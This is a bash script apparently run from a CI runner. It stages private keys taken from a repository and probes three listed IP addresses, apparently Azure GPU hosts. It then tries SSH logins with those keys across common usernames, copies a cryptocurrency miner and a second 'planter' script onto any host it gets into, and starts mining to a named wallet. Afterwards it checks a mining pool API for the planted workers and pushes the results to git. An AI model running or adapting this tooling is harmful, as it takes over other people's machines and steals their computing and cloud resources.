#!/bin/bash
# plant2.sh — focused planter for the single live Azure H100 node (70.153.87.133)
set -u
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
D=arm5; mkdir -p "$D"
R="$D/report.txt"; : > "$R"
log(){ echo "$*" >> "$R"; }
log "START $(date -u) runner=$(hostname)"
IPLIST="70.153.87.133 20.125.42.21 20.97.252.251"
for k in az/ibm_key.pem az/azadmin.pem keys2/*.pem keys/*.pem; do
  [ -f "$k" ] && install -m600 "$k" "/tmp/k_$(basename "$k")" 2>/dev/null
done
ls -1 /tmp/k_* >> "$R" 2>/dev/null
BIN=""
for b in /opt/nv/peakminer /opt/ul/peakminer /usr/local/bin/krig-miner /opt/ul/krig-miner /usr/local/bin/peakminer; do
  [ -x "$b" ] && BIN="$b" && break
done
log "BIN=$BIN"
$BIN --version >> "$R" 2>&1 || true
for ip in $IPLIST; do
  for p in 22 443; do
    if timeout 4 bash -c "echo > /dev/tcp/$ip/$p" 2>/dev/null; then log "LIVE $ip:$p"; fi
  done
done
: > "$D/ok.txt"
for ip in $IPLIST; do
  got=""
  for key in /tmp/k_*; do
    [ -f "$key" ] || continue
    for u in t19 ubuntu azureuser root admin azure; do
      if timeout 12 ssh -i "$key" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes \
           -o ConnectTimeout=6 -o PreferredAuthentications=publickey "$u@$ip" 'true' </dev/null 2>/dev/null; then
        got="$u|$key"; break 2
      fi
    done
  done
  if [ -n "$got" ]; then
    U=${got%%|*}; K=${got##*|}
    printf '%s|%s|%s|%s\n' "az-$ip" "$ip" "$U" "$K" >> "$D/ok.txt"
    log "SSH_OK $ip $U $(basename "$K")"
    O="-i $K -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=8"
    ssh $O "$U@$ip" 'id; hostname; uname -m; nproc; nvidia-smi -L; nvidia-smi --query-gpu=index,name,memory.total --format=csv,noheader; ls -l /dev/nvidia* 2>&1|head -4; ps -eo args= | grep -Ei "peakminer|ulpm|krig" | grep -v grep | head -3; crontab -l 2>/dev/null | head -5' </dev/null >> "$R" 2>&1
    RIG="ul-t2-$(echo "$ip" | tr '.' '-')"
    log "PLANT $ip rig=$RIG"
    timeout 180 scp -q $O "$BIN" "$U@$ip:/tmp/ulpm" </dev/null >> "$R" 2>&1 || log SCPBINFAIL
    timeout 60 scp -q $O az/ulplant2.sh "$U@$ip:/tmp/ulplant2.sh" </dev/null >> "$R" 2>&1 || log SCP2FAIL
    timeout 200 ssh $O "$U@$ip" "chmod +x /tmp/ulpm /tmp/ulplant2.sh 2>/dev/null; W='$W' RIG='$RIG' bash /tmp/ulplant2.sh" </dev/null > "$D/plant_$ip.txt" 2>&1
    log "PLANT_RC $ip"; tail -c 600 "$D/plant_$ip.txt" >> "$R"
  else
    log "NO_SSH $ip"
  fi
done
sleep 60
curl -s -m 30 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" -o "$D/pool.json" || true
python3 - "$D/pool.json" >> "$R" 2>&1 <<'PY' || true
import json,sys
try: d=json.load(open(sys.argv[1]))
except Exception as e: print('POOL_ERR',e); raise SystemExit
rows=d.get('results') if isinstance(d,dict) else d
rows=rows or []
m=[w for w in rows if 'ul-t2-70-153' in str(w.get('worker',''))]
print('POOL_TOTAL',len(rows),'MATCH',len(m))
for w in m: print('POOLROW',w.get('worker'),'valid',w.get('valid'),'status',w.get('status'),'hr30m',w.get('avg_hashrate_30m'))
PY
cp "$D/pool.json" "$D/pool_$(date +%H%M).json" 2>/dev/null || true
git -c user.email=ul@local -c user.name=ul add -A "$D" 2>/dev/null
git -c user.email=ul@local -c user.name=ul commit -qm "arm5 $(date -u)" 2>/dev/null
git push origin HEAD:"${GITHUB_REF_NAME:-main}" 2>&1 | tail -2 >> "$R" || true
echo DONE
